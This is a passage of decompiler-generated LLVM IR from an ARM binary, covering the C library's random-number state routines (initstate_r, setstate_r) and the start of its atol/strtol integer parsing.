  %v2_26c64 = add i32 %v2_26c60, 2147483647
  %v2_26c64.v2_26c60 = select i1 %v8_26c60, i32 %v2_26c64, i32 %v2_26c60
  store i32 %v2_26c64.v2_26c60, i32* %r4.global-to-local, align 4
  %v2_26c68 = add i32 %v1_26c6826, 4
  %v3_26c68 = inttoptr i32 %v2_26c68 to i32*
  store i32 %v2_26c64.v2_26c60, i32* %v3_26c68, align 4
  %v4_26c68 = load i32, i32* %r8.global-to-local, align 4
  %v5_26c68 = add i32 %v4_26c68, 4
  store i32 %v5_26c68, i32* %r8.global-to-local, align 4
  %v0_26c6c.pre = load i32, i32* %r7.global-to-local, align 4
  %v1_26c6c.pre = load i32, i32* %sl.global-to-local, align 4
  %v0_26c70.pre = load i32, i32* %r4.global-to-local, align 4
  %v1_26c78 = add i32 %v0_26c6c.pre, 1
  store i32 %v1_26c78, i32* %r7.global-to-local, align 4
  %v5_26c7c = icmp slt i32 %v0_26c6c.pre, %v1_26c6c.pre
  br i1 %v5_26c7c, label %dec_label_pc_26c48.dec_label_pc_26c48_crit_edge, label %dec_label_pc_26c6c.dec_label_pc_26c80_crit_edge

dec_label_pc_26c48.dec_label_pc_26c48_crit_edge:  ; preds = %dec_label_pc_26c48
  %v1_26c50.pre = load i32, i32* %fp.global-to-local, align 4
  %v1_26c5c.pre = load i32, i32* %sb.global-to-local, align 4
  br label %dec_label_pc_26c48

dec_label_pc_26c6c.dec_label_pc_26c80_crit_edge:  ; preds = %dec_label_pc_26c48
  %v0_26c90.pre = load i32, i32* %r6.global-to-local, align 4
  br label %dec_label_pc_26c80

dec_label_pc_26c80:                               ; preds = %dec_label_pc_26c6c.dec_label_pc_26c80_crit_edge, %dec_label_pc_26c2c
  %v0_26c90 = phi i32 [ %v0_26c90.pre, %dec_label_pc_26c6c.dec_label_pc_26c80_crit_edge ], [ %v0_26c3c, %dec_label_pc_26c2c ]
  %v0_26c84.lcssa = phi i32 [ %v1_26c6c.pre, %dec_label_pc_26c6c.dec_label_pc_26c80_crit_edge ], [ %v4_26c2c, %dec_label_pc_26c2c ]
  %v2_26c84 = mul i32 %v0_26c84.lcssa, 10
  store i32 %v2_26c84, i32* @r4, align 4
  %v0_26c88 = load i32, i32* %r5.global-to-local, align 4
  %v1_26c88 = add i32 %v0_26c88, 14
  %v2_26c88 = inttoptr i32 %v1_26c88 to i8*
  %v3_26c88 = load i8, i8* %v2_26c88, align 1
  %v4_26c88 = sext i8 %v3_26c88 to i32
  %v2_26c8c = ptrtoint i32* %stack_var_-44 to i32
  store i32 %v2_26c8c, i32* %r7.global-to-local, align 4
  %v4_26c90 = mul nsw i32 %v4_26c88, 4
  %v5_26c90 = add i32 %v0_26c90, %v4_26c90
  %v1_26c94 = inttoptr i32 %v0_26c88 to i32*
  store i32 %v5_26c90, i32* %v1_26c94, align 4
  %v3_26c94 = add i32 %v0_26c88, 4
  %v4_26c94 = inttoptr i32 %v3_26c94 to i32*
  %v5_26c94 = load i32, i32* %r6.global-to-local, align 4
  store i32 %v5_26c94, i32* %v4_26c94, align 4
  br label %dec_label_pc_26ca0

dec_label_pc_26c9c:                               ; preds = %dec_label_pc_26ca0
  %v0_26ca4 = load i32, i32* %r5.global-to-local, align 4
  %v2_26c9c = inttoptr i32 %v0_26ca4 to i32*
  %v3_26c9c = call i32 @__GI_random_r(i32* %v2_26c9c, i32 %v2_26c8c)
  br label %dec_label_pc_26ca0

dec_label_pc_26ca0:                               ; preds = %dec_label_pc_26c80, %dec_label_pc_26c9c
  %v0_26ca0 = load i32, i32* @r4, align 4
  %v1_26ca0 = add i32 %v0_26ca0, -1
  store i32 %v1_26ca0, i32* @r4, align 4
  %v6_26ca0 = icmp slt i32 %v1_26ca0, 0
  br i1 %v6_26ca0, label %dec_label_pc_26cb0, label %dec_label_pc_26c9c

dec_label_pc_26cb0:                               ; preds = %dec_label_pc_26ca0, %bb23
  %v2_26cb8.pre = load i32, i32* %stack_var_-36, align 4
  br label %dec_label_pc_26cb4

dec_label_pc_26cb4:                               ; preds = %.dec_label_pc_26cb4_crit_edge, %dec_label_pc_26cb0
  %v2_26cb8 = phi i32 [ %v3_26bf4, %.dec_label_pc_26cb4_crit_edge ], [ %v2_26cb8.pre, %dec_label_pc_26cb0 ]
  %v1_26cbc = phi i32 [ -1, %.dec_label_pc_26cb4_crit_edge ], [ 0, %dec_label_pc_26cb0 ]
  store i32 %v2_26cb8, i32* @r4, align 4
  ret i32 %v1_26cbc

; uselistorder directives
  uselistorder i32 %v1_26ca0, { 1, 0 }
  uselistorder i32 %v0_26c88, { 1, 0, 2 }
  uselistorder i32 %v0_26c6c.pre, { 1, 0 }
  uselistorder i32 %v5_26c68, { 1, 0 }
  uselistorder i32 %v0_26c4c27, { 1, 0 }
  uselistorder i32 %v0_26c3c, { 1, 0, 2 }
  uselistorder i32 %tmp, { 0, 1, 3, 2 }
  uselistorder i32* %r6.global-to-local, { 0, 2, 1, 3 }
  uselistorder i32* %r4.global-to-local, { 1, 2, 0 }
  uselistorder i32 127773, { 1, 0 }
  uselistorder label %dec_label_pc_26cb4, { 1, 0 }
  uselistorder label %dec_label_pc_26ca0, { 1, 0 }
  uselistorder label %dec_label_pc_26c48, { 1, 0 }
  uselistorder label %bb23, { 1, 0 }
}

define i32 @"$d.2"(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
dec_label_pc_26cc0:
  %v0_26cc0 = load i1, i1* @cpsr_z, align 1
  br i1 %v0_26cc0, label %bb, label %.thread1

bb:                                               ; preds = %dec_label_pc_26cc0
  %v2_26cc0 = load i32, i32* @r7, align 4
  %v5_26cc0 = udiv i32 %v2_26cc0, 8
  %v6_26cc0 = and i32 %v5_26cc0, %arg1
  %v3_26cc4 = load i32, i32* @fp, align 4
  %v8_26cc4 = shl i32 %v6_26cc0, %v3_26cc4
  %v9_26cc4 = and i32 %v8_26cc4, %arg1
  %v2_26cc8 = load i32, i32* @sp, align 4
  %v8_26cc8 = shl i32 %v2_26cc8, %arg3
  %v9_26cc8 = and i32 %v8_26cc8, %arg2
  call void @__pseudo_branch(i32 %v9_26cc8)
  br label %.thread1

.thread1:                                         ; preds = %dec_label_pc_26cc0, %bb
  %v10_26cc8 = phi i32 [ %arg1, %dec_label_pc_26cc0 ], [ %v9_26cc4, %bb ]
  ret i32 %v10_26cc8

; uselistorder directives
  uselistorder i32 %arg1, { 2, 0, 1 }
  uselistorder label %.thread1, { 1, 0 }
}

define i32 @__GI_initstate_r(i32* %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  store i32 %arg3, i32* %r3.global-to-local, align 4
  store i32 %arg2, i32* %r2.global-to-local, align 4
  %tmp = ptrtoint i32* %arg1 to i32
  store i32 %tmp, i32* %r1.global-to-local, align 4
  %v3_26ccc = load i32, i32* @r4, align 4
  %v6_26ccc = load i32, i32* @r5, align 4
  store i32 %tmp, i32* @r7, align 4
  store i32 %arg3, i32* @r5, align 4
  %tmp28 = icmp ult i32 %arg2, 128
  br i1 %tmp28, label %dec_label_pc_26cfc, label %dec_label_pc_26cec

dec_label_pc_26cec:                               ; preds = %entry
  %v2_26cec = icmp ugt i32 %arg2, 254
  %v7_26cec = icmp eq i32 %arg2, 255
  %v2_26cf0 = xor i1 %v7_26cec, true
  %v3_26cf0 = and i1 %v2_26cec, %v2_26cf0
  br i1 %v3_26cf0, label %bb, label %bb21

bb:                                               ; preds = %dec_label_pc_26cec
  store i32 4, i32* @r4, align 4
  br label %bb21

bb21:                                             ; preds = %dec_label_pc_26cec, %bb
  %v1_26d287 = phi i32 [ %v3_26ccc, %dec_label_pc_26cec ], [ 4, %bb ]
  %v2_26cf4 = xor i1 %v2_26cec, true
  %v3_26cf4 = or i1 %v7_26cec, %v2_26cf4
  br i1 %v3_26cf4, label %bb22, label %bb26

bb22:                                             ; preds = %bb21
  store i32 3, i32* @r4, align 4
  br label %bb26

dec_label_pc_26cfc:                               ; preds = %entry
  %tmp29 = icmp ugt i32 %arg2, 31
  br i1 %tmp29, label %dec_label_pc_26d14, label %dec_label_pc_26d04

dec_label_pc_26d04:                               ; preds = %dec_label_pc_26cfc
  %tmp30 = icmp ugt i32 %arg2, 7
  br i1 %tmp30, label %.thread10, label %dec_label_pc_26d84

.thread10:                                        ; preds = %dec_label_pc_26d04
  store i32 0, i32* @r4, align 4
  br label %bb26

dec_label_pc_26d14:                               ; preds = %dec_label_pc_26cfc
  %v2_26d14 = icmp ugt i32 %arg2, 62
  %v7_26d14 = icmp eq i32 %arg2, 63
  %v2_26d18 = xor i1 %v7_26d14, true
  %v3_26d18 = and i1 %v2_26d14, %v2_26d18
  br i1 %v3_26d18, label %bb23, label %bb24

bb23:                                             ; preds = %dec_label_pc_26d14
  store i32 2, i32* @r4, align 4
  br label %bb24

bb24:                                             ; preds = %dec_label_pc_26d14, %bb23
  %v1_26d286 = phi i32 [ %v3_26ccc, %dec_label_pc_26d14 ], [ 2, %bb23 ]
  %v2_26d1c = xor i1 %v2_26d14, true
  %v3_26d1c = or i1 %v7_26d14, %v2_26d1c
  br i1 %v3_26d1c, label %bb25, label %bb26

bb25:                                             ; preds = %bb24
  store i32 1, i32* @r4, align 4
  br label %bb26

bb26:                                             ; preds = %.thread10, %bb22, %bb21, %bb24, %bb25
  %v1_26d34 = phi i32 [ 3, %bb22 ], [ %v1_26d287, %bb21 ], [ %v1_26d286, %bb24 ], [ 1, %bb25 ], [ 0, %.thread10 ]
  store i32 add (i32 ptrtoint (i32* @global_var_428d0.3044 to i32), i32 -34336), i32* %r3.global-to-local, align 4
  %v4_26d28 = mul i32 %v1_26d34, 4
  %v5_26d28 = add i32 %v4_26d28, add (i32 ptrtoint (i32* @global_var_428d0.3044 to i32), i32 -34336)
  store i32 %v5_26d28, i32* %r2.global-to-local, align 4
  %v1_26d2c = add i32 %v4_26d28, add (i32 ptrtoint (i32* @global_var_428d0.3044 to i32), i32 -34316)
  %v2_26d2c = inttoptr i32 %v1_26d2c to i32*
  %v3_26d2c = load i32, i32* %v2_26d2c, align 4
  store i32 %v3_26d2c, i32* %r1.global-to-local, align 4
  %v1_26d30 = add i32 %tmp, 4
  store i32 %v1_26d30, i32* @r6, align 4
  %v6_26d34 = inttoptr i32 %v5_26d28 to i32*
  %v7_26d34 = load i32, i32* %v6_26d34, align 4
  store i32 %v7_26d34, i32* %r2.global-to-local, align 4
  %v4_26d38 = mul i32 %v3_26d2c, 4
  %v5_26d38 = add i32 %v4_26d38, %v1_26d30
  store i32 %v5_26d38, i32* %r3.global-to-local, align 4
  %v2_26d3c = add i32 %arg3, 16
  %v3_26d3c = inttoptr i32 %v2_26d3c to i32*
  store i32 %v5_26d38, i32* %v3_26d3c, align 4
  %v0_26d40 = load i32, i32* %r2.global-to-local, align 4
  %v1_26d40 = trunc i32 %v0_26d40 to i8
  %v2_26d40 = load i32, i32* @r5, align 4
  %v3_26d40 = add i32 %v2_26d40, 14
  %v4_26d40 = inttoptr i32 %v3_26d40 to i8*
  store i8 %v1_26d40, i8* %v4_26d40, align 1
  %v0_26d44 = load i32, i32* %r1.global-to-local, align 4
  %v1_26d44 = trunc i32 %v0_26d44 to i8
  %v2_26d44 = load i32, i32* @r5, align 4
  %v3_26d44 = add i32 %v2_26d44, 13
  %v4_26d44 = inttoptr i32 %v3_26d44 to i8*
  store i8 %v1_26d44, i8* %v4_26d44, align 1
  %v0_26d48 = load i32, i32* @r4, align 4
  %v1_26d48 = trunc i32 %v0_26d48 to i8
  %v2_26d48 = load i32, i32* @r5, align 4
  %v3_26d48 = add i32 %v2_26d48, 12
  %v4_26d48 = inttoptr i32 %v3_26d48 to i8*
  store i8 %v1_26d48, i8* %v4_26d48, align 1
  %v0_26d4c = load i32, i32* @r6, align 4
  %v1_26d4c = load i32, i32* @r5, align 4
  %v2_26d4c = add i32 %v1_26d4c, 8
  %v3_26d4c = inttoptr i32 %v2_26d4c to i32*
  store i32 %v0_26d4c, i32* %v3_26d4c, align 4
  %v0_26d50 = load i32, i32* @r5, align 4
  store i32 %v0_26d50, i32* %r1.global-to-local, align 4
  %v0_26d54 = load i32, i32* @r0, align 4
  %v2_26d54 = inttoptr i32 %v0_26d54 to i32*
  %v3_26d54 = call i32 @srandom_r(i32* %v2_26d54, i32 %v0_26d50)
  store i32 %v3_26d54, i32* %r0.global-to-local, align 4
  %v0_26d58 = load i32, i32* @r4, align 4
  %v2_26d58 = icmp eq i32 %v0_26d58, 0
  br i1 %v2_26d58, label %bb27, label %.thread4

bb27:                                             ; preds = %bb26
  %v1_26d7412 = load i32, i32* @r7, align 4
  %v2_26d7413 = inttoptr i32 %v1_26d7412 to i32*
  store i32 0, i32* %v2_26d7413, align 4
  %v1_26d78 = load i32, i32* @r4, align 4
  store i32 %v1_26d78, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_26da8

.thread4:                                         ; preds = %bb26
  %v1_26d5c = load i32, i32* @r5, align 4
  %v2_26d5c = add i32 %v1_26d5c, 4
  %v3_26d5c = inttoptr i32 %v2_26d5c to i32*
  %v4_26d5c = load i32, i32* %v3_26d5c, align 4
  %v1_26d60 = load i32, i32* @r6, align 4
  %v3_26d60 = sub i32 %v4_26d5c, %v1_26d60
  %v4_26d64 = sdiv i32 %v3_26d60, 4
  store i32 5, i32* %r2.global-to-local, align 4
  %v4_26d6c = mul i32 %v4_26d64, 5
  %v5_26d6c = add i32 %v4_26d6c, %v0_26d58
  store i32 %v5_26d6c, i32* %r3.global-to-local, align 4
  store i32 0, i32* %r0.global-to-local, align 4
  %v1_26d74 = load i32, i32* @r7, align 4
  %v2_26d74 = inttoptr i32 %v1_26d74 to i32*
  store i32 0, i32* %v2_26d74, align 4
  %v1_26d7c = load i32, i32* %r3.global-to-local, align 4
  %v2_26d7c = load i32, i32* @r7, align 4
  %v3_26d7c = inttoptr i32 %v2_26d7c to i32*
  store i32 %v1_26d7c, i32* %v3_26d7c, align 4
  %v1_26db0.pre = load i32, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_26da8

dec_label_pc_26d84:                               ; preds = %dec_label_pc_26d04
  store i32 113568, i32* %r3.global-to-local, align 4
  %v0_26d88 = call i32 @__aeabi_read_tp()
  %v3_26d8c = load i16, i16* @global_var_42934.3040, align 2
  %v4_26d8c = sext i16 %v3_26d8c to i32
  store i32 22, i32* %r2.global-to-local, align 4
  %v3_26d94 = add i32 %v4_26d8c, %v0_26d88
  %v4_26d94 = inttoptr i32 %v3_26d94 to i32*
  store i32 22, i32* %v4_26d94, align 4
  store i32 %v4_26d8c, i32* %r3.global-to-local, align 4
  %v0_26da0 = load i32, i32* %r2.global-to-local, align 4
  store i32 %v0_26da0, i32* %v4_26d94, align 4
  store i32 -1, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_26da8

dec_label_pc_26da8:                               ; preds = %bb27, %.thread4, %dec_label_pc_26d84
  %v1_26db0 = phi i32 [ %v1_26db0.pre, %.thread4 ], [ %v1_26d78, %bb27 ], [ -1, %dec_label_pc_26d84 ]
  store i32 %v3_26ccc, i32* @r4, align 4
  store i32 %v6_26ccc, i32* @r5, align 4
  ret i32 %v1_26db0

; uselistorder directives
  uselistorder i32 %v4_26d8c, { 1, 0 }
  uselistorder i1 %v7_26d14, { 1, 0 }
  uselistorder i1 %v7_26cec, { 1, 0 }
  uselistorder i32* %r3.global-to-local, { 1, 2, 3, 4, 5, 6, 0 }
  uselistorder i32* %r2.global-to-local, { 1, 2, 3, 4, 5, 6, 0 }
  uselistorder i32* %r1.global-to-local, { 1, 2, 3, 0 }
  uselistorder i32* %r0.global-to-local, { 0, 2, 3, 1, 4 }
  uselistorder i32 %arg2, { 3, 4, 0, 1, 6, 5, 2, 7 }
  uselistorder label %dec_label_pc_26da8, { 2, 1, 0 }
  uselistorder label %bb26, { 4, 3, 0, 1, 2 }
  uselistorder label %bb24, { 1, 0 }
  uselistorder label %bb21, { 1, 0 }
}

define i32 @setstate_r(i32 %arg1, i32* %arg2) local_unnamed_addr {
entry:
  %cpsr_z.global-to-local = alloca i1, align 1
  %r0.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %r6.global-to-local = alloca i32, align 4
  %r7.global-to-local = alloca i32, align 4
  %r8.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i32* %arg2 to i32
  store i32 %tmp, i32* %r1.global-to-local, align 4
  store i32 %arg1, i32* %r0.global-to-local, align 4
  %stack_var_-24 = alloca i32, align 4
  %v3_26dc4 = load i32, i32* @r4, align 4
  store i32 %v3_26dc4, i32* %stack_var_-24, align 4
  store i32 %tmp, i32* %r4.global-to-local, align 4
  %v1_26dcc = add i32 %tmp, 12
  %v2_26dcc = inttoptr i32 %v1_26dcc to i8*
  %v3_26dcc = load i8, i8* %v2_26dcc, align 1
  %v4_26dcc = zext i8 %v3_26dcc to i32
  store i32 %v4_26dcc, i32* %r1.global-to-local, align 4
  %v2_26dd0 = icmp eq i8 %v3_26dcc, 0
  store i1 %v2_26dd0, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_26dd0, label %.thread5, label %.thread6

.thread5:                                         ; preds = %entry
  %v1_26dd812 = add i32 %arg1, 4
  store i32 %v1_26dd812, i32* %r6.global-to-local, align 4
  %v1_26ddc13 = add i32 %tmp, 8
  %v2_26ddc14 = inttoptr i32 %v1_26ddc13 to i32*
  %v3_26ddc15 = load i32, i32* %v2_26ddc14, align 4
  store i32 %v3_26ddc15, i32* %r0.global-to-local, align 4
  %v3_26df8 = add i32 %v3_26ddc15, -4
  %v4_26df8 = inttoptr i32 %v3_26df8 to i32*
  store i32 %v4_26dcc, i32* %v4_26df8, align 4
  br label %bb

.thread6:                                         ; preds = %entry
  %v2_26dd4 = add i32 %tmp, 4
  %v3_26dd4 = inttoptr i32 %v2_26dd4 to i32*
  %v4_26dd4 = load i32, i32* %v3_26dd4, align 4
  %v1_26dd8 = add i32 %arg1, 4
  store i32 %v1_26dd8, i32* %r6.global-to-local, align 4
  %v1_26ddc = add i32 %tmp, 8
  %v2_26ddc = inttoptr i32 %v1_26ddc to i32*
  %v3_26ddc = load i32, i32* %v2_26ddc, align 4
  store i32 %v3_26ddc, i32* %r0.global-to-local, align 4
  %v3_26de4 = sub i32 %v4_26dd4, %v3_26ddc
  %v4_26de8 = sdiv i32 %v3_26de4, 4
  %v4_26dec = sext i8 %v3_26dcc to i32
  store i32 %v4_26dec, i32* %r1.global-to-local, align 4
  %v4_26df4 = mul i32 %v4_26de8, 5
  %v5_26df4 = add i32 %v4_26df4, %v4_26dec
  %v3_26dfc = add i32 %v3_26ddc, -4
  %v4_26dfc = inttoptr i32 %v3_26dfc to i32*
  store i32 %v5_26df4, i32* %v4_26dfc, align 4
  br label %bb

bb:                                               ; preds = %.thread5, %.thread6
  %v0_26e00 = load i32, i32* %r6.global-to-local, align 4
  %v1_26e00 = add i32 %v0_26e00, -4
  %v2_26e00 = inttoptr i32 %v1_26e00 to i32*
  %v3_26e00 = load i32, i32* %v2_26e00, align 4
  store i32 %v3_26e00, i32* %r8.global-to-local, align 4
  %v2_26e0c = udiv i32 %v3_26e00, 5
  %v3_26e0c = urem i32 %v3_26e00, 5
  store i32 %v2_26e0c, i32* %r0.global-to-local, align 4
  store i32 %v3_26e0c, i32* %r1.global-to-local, align 4
  %v2_26e14 = icmp ugt i32 %v3_26e0c, 3
  %v7_26e14 = icmp eq i32 %v3_26e0c, 4
  store i1 %v7_26e14, i1* %cpsr_z.global-to-local, align 1
  store i32 ptrtoint (i32* @global_var_428d0.3044 to i32), i32* %r5.global-to-local, align 4
  %v2_26e1c = xor i1 %v7_26e14, true
  %v3_26e1c = and i1 %v2_26e14, %v2_26e1c
  br i1 %v3_26e1c, label %dec_label_pc_26e84, label %dec_label_pc_26e20

dec_label_pc_26e20:                               ; preds = %bb
  %v4_26e28 = mul nuw nsw i32 %v3_26e0c, 4
  %v5_26e28 = add i32 %v4_26e28, add (i32 ptrtoint (i32* @global_var_428d0.3044 to i32), i32 -34336)
  %v1_26e2c = add i32 %v4_26e28, add (i32 ptrtoint (i32* @global_var_428d0.3044 to i32), i32 -34316)
  %v2_26e2c = inttoptr i32 %v1_26e2c to i32*
  %v3_26e2c = load i32, i32* %v2_26e2c, align 4
  store i32 %v3_26e2c, i32* %r5.global-to-local, align 4
  %v6_26e30 = inttoptr i32 %v5_26e28 to i32*
  %v7_26e30 = load i32, i32* %v6_26e30, align 4
  store i32 %v7_26e30, i32* %r7.global-to-local, align 4
  %v2_26e34 = icmp eq i32 %v3_26e0c, 0
  store i1 %v2_26e34, i1* %cpsr_z.global-to-local, align 1
  %v1_26e38 = trunc i32 %v3_26e2c to i8
  %v2_26e38 = load i32, i32* %r4.global-to-local, align 4
  %v3_26e38 = add i32 %v2_26e38, 13
  %v4_26e38 = inttoptr i32 %v3_26e38 to i8*
  store i8 %v1_26e38, i8* %v4_26e38, align 1
  %v0_26e3c = load i32, i32* %r7.global-to-local, align 4
  %v1_26e3c = trunc i32 %v0_26e3c to i8
  %v2_26e3c = load i32, i32* %r4.global-to-local, align 4
  %v3_26e3c = add i32 %v2_26e3c, 14
  %v4_26e3c = inttoptr i32 %v3_26e3c to i8*
  store i8 %v1_26e3c, i8* %v4_26e3c, align 1
  %v0_26e40 = load i32, i32* %r1.global-to-local, align 4
  %v1_26e40 = trunc i32 %v0_26e40 to i8
  %v2_26e40 = load i32, i32* %r4.global-to-local, align 4
  %v3_26e40 = add i32 %v2_26e40, 12
  %v4_26e40 = inttoptr i32 %v3_26e40 to i8*
  store i8 %v1_26e40, i8* %v4_26e40, align 1
  %v0_26e44 = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_26e44, label %dec_label_pc_26e70, label %dec_label_pc_26e48

dec_label_pc_26e48:                               ; preds = %dec_label_pc_26e20
  %v0_26e4c = load i32, i32* %r8.global-to-local, align 4
  %v2_26e50 = sdiv i32 %v0_26e4c, 5
  store i32 %v2_26e50, i32* %r0.global-to-local, align 4
  %v0_26e54 = load i32, i32* %r6.global-to-local, align 4
  %v4_26e54 = mul i32 %v2_26e50, 4
  %v5_26e54 = add i32 %v4_26e54, %v0_26e54
  %v1_26e58 = load i32, i32* %r4.global-to-local, align 4
  %v2_26e58 = add i32 %v1_26e58, 4
  %v3_26e58 = inttoptr i32 %v2_26e58 to i32*
  store i32 %v5_26e54, i32* %v3_26e58, align 4
  %v0_26e5c = load i32, i32* %r7.global-to-local, align 4
  %v1_26e5c = load i32, i32* %r0.global-to-local, align 4
  %v2_26e5c = add i32 %v1_26e5c, %v0_26e5c
  %v0_26e60 = load i32, i32* %r5.global-to-local, align 4
  %v2_26e64 = udiv i32 %v2_26e5c, %v0_26e60
  %v3_26e64 = urem i32 %v2_26e5c, %v0_26e60
  store i32 %v2_26e64, i32* %r0.global-to-local, align 4
  %v0_26e68 = load i32, i32* %r6.global-to-local, align 4
  %v4_26e68 = mul i32 %v3_26e64, 4
  %v5_26e68 = add i32 %v0_26e68, %v4_26e68
  store i32 %v5_26e68, i32* %r1.global-to-local, align 4
  %v1_26e6c = load i32, i32* %r4.global-to-local, align 4
  %v2_26e6c = inttoptr i32 %v1_26e6c to i32*
  store i32 %v5_26e68, i32* %v2_26e6c, align 4
  br label %dec_label_pc_26e70

dec_label_pc_26e70:                               ; preds = %dec_label_pc_26e20, %dec_label_pc_26e48
  %v0_26e70 = load i32, i32* %r6.global-to-local, align 4
  %v1_26e70 = load i32, i32* %r5.global-to-local, align 4
  %v4_26e70 = mul i32 %v1_26e70, 4
  %v5_26e70 = add i32 %v4_26e70, %v0_26e70
  store i32 0, i32* %r0.global-to-local, align 4
  %v1_26e78 = load i32, i32* %r4.global-to-local, align 4
  %v2_26e78 = add i32 %v1_26e78, 16
  %v3_26e78 = inttoptr i32 %v2_26e78 to i32*
  store i32 %v5_26e70, i32* %v3_26e78, align 4
  %v0_26e7c = load i32, i32* %r6.global-to-local, align 4
  %v1_26e7c = load i32, i32* %r4.global-to-local, align 4
  %v2_26e7c = add i32 %v1_26e7c, 8
  %v3_26e7c = inttoptr i32 %v2_26e7c to i32*
  store i32 %v0_26e7c, i32* %v3_26e7c, align 4
  %v1_26ea0.pre = load i32, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_26e9c

dec_label_pc_26e84:                               ; preds = %bb
  %v0_26e88 = call i32 @__aeabi_read_tp()
  %v3_26e8c = load i16, i16* @global_var_42934.3040, align 2
  %v4_26e8c = sext i16 %v3_26e8c to i32
  %v3_26e94 = add i32 %v4_26e8c, %v0_26e88
  %v4_26e94 = inttoptr i32 %v3_26e94 to i32*
  store i32 22, i32* %v4_26e94, align 4
  store i32 -1, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_26e9c

dec_label_pc_26e9c:                               ; preds = %dec_label_pc_26e70, %dec_label_pc_26e84
  %v1_26ea0 = phi i32 [ %v1_26ea0.pre, %dec_label_pc_26e70 ], [ -1, %dec_label_pc_26e84 ]
  %v2_26e9c = load i32, i32* %stack_var_-24, align 4
  store i32 %v2_26e9c, i32* @r4, align 4
  ret i32 %v1_26ea0

; uselistorder directives
  uselistorder i32 %v0_26e60, { 1, 0 }
  uselistorder i32 %v2_26e5c, { 1, 0 }
  uselistorder i32 %v3_26e00, { 1, 0, 2 }
  uselistorder i32 %tmp, { 1, 2, 0, 4, 3, 5 }
  uselistorder i32* %r6.global-to-local, { 1, 2, 3, 4, 5, 0, 6 }
  uselistorder i32* %r1.global-to-local, { 3, 1, 2, 4, 5, 0 }
  uselistorder i32* %r0.global-to-local, { 5, 6, 7, 1, 3, 4, 2, 8, 9, 0 }
  uselistorder i32 add (i32 ptrtoint (i32* @global_var_428d0.3044 to i32), i32 -34336), { 0, 2, 1 }
  uselistorder i32 %arg1, { 1, 0, 2 }
  uselistorder label %dec_label_pc_26e9c, { 1, 0 }
  uselistorder label %dec_label_pc_26e70, { 1, 0 }
  uselistorder label %bb, { 1, 0 }
}

define i32 @atol(i32 %arg1) local_unnamed_addr {
entry:
  store i32 0, i32* @r1, align 4
  store i32 10, i32* @r2, align 4
  %v0_26ec0 = call i32 @strtol()
  ret i32 %v0_26ec0
}

define i32 @strtol() local_unnamed_addr {
entry:
  store i32 1, i32* @r3, align 4
  %v0_26edc = call i32 @_stdlib_strto_l()
  ret i32 %v0_26edc
}

define i32 @_stdlib_strto_l() local_unnamed_addr {
entry:
  %fp.global-to-local = alloca i32, align 4
  %ip.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %r7.global-to-local = alloca i32, align 4
  %r8.global-to-local = alloca i32, align 4
  %sb.global-to-local = alloca i32, align 4
  %sl.global-to-local = alloca i32, align 4
  store i32 ptrtoint (i32* @global_var_428d0.3044 to i32), i32* %ip.global-to-local, align 4
  %v0_26f00 = load i32, i32* @r1, align 4
  store i32 %v0_26f00, i32* %sb.global-to-local, align 4
  %v0_26f04 = load i32, i32* @r2, align 4
  store i32 %v0_26f04, i32* %r5.global-to-local, align 4
  %v0_26f08 = load i32, i32* @r0, align 4
  store i32 %v0_26f08, i32* %r4.global-to-local, align 4
  %v0_26f0c = load i32, i32* @r3, align 4
  br label %dec_label_pc_26f18

dec_label_pc_26f14:                               ; preds = %dec_label_pc_26f18
  %v1_26f14 = add i32 %v0_26f50, 1
  store i32 %v1_26f14, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_26f18

dec_label_pc_26f18:                               ; preds = %entry, %dec_label_pc_26f14
  %v0_26f50 = phi i32 [ %v0_26f08, %entry ], [ %v1_26f14, %dec_label_pc_26f14 ]
  %v1_26f18 = inttoptr i32 %v0_26f50 to i8*
  %v2_26f18 = load i8, i8* %v1_26f18, align 1
  %v3_26f18 = zext i8 %v2_26f18 to i32
  store i32 %v3_26f18, i32* %r1.global-to-local, align 4
  %v4_26f1c = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_428d0.3044 to i32), i32 360) to i32*), align 4
  %v2_26f20 = mul nuw nsw i32 %v3_26f18, 2
  %v2_26f24 = add i32 %v2_26f20, %v4_26f1c
  %v3_26f24 = inttoptr i32 %v2_26f24 to i16*
  %v4_26f24 = load i16, i16* %v3_26f24, align 2
  %v1_26f28 = and i16 %v4_26f24, 32
  %v2_26f28 = icmp eq i16 %v1_26f28, 0
  br i1 %v2_26f28, label %dec_label_pc_26f30, label %dec_label_pc_26f14

dec_label_pc_26f30:                               ; preds = %dec_label_pc_26f18
  %v7_26f30 = icmp eq i8 %v2_26f18, 43
  br i1 %v7_26f30, label %dec_label_pc_26f50, label %dec_label_pc_26f38

dec_label_pc_26f38:                               ; preds = %dec_label_pc_26f30
  %v7_26f38 = icmp eq i8 %v2_26f18, 45
  br i1 %v7_26f38, label %dec_label_pc_26f50, label %bb

bb:                                               ; preds = %dec_label_pc_26f38
  store i32 0, i32* %r7.global-to-local, align 4
  br label %dec_label_pc_26f54

dec_label_pc_26f50:                               ; preds = %dec_label_pc_26f30, %dec_label_pc_26f38
  %storemerge47 = phi i32 [ 1, %dec_label_pc_26f38 ], [ 0, %dec_label_pc_26f30 ]
  store i32 %storemerge47, i32* %r7.global-to-local, align 4
  %v1_26f50 = add i32 %v0_26f50, 1
  store i32 %v1_26f50, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_26f54

dec_label_pc_26f54:                               ; preds = %bb, %dec_label_pc_26f50
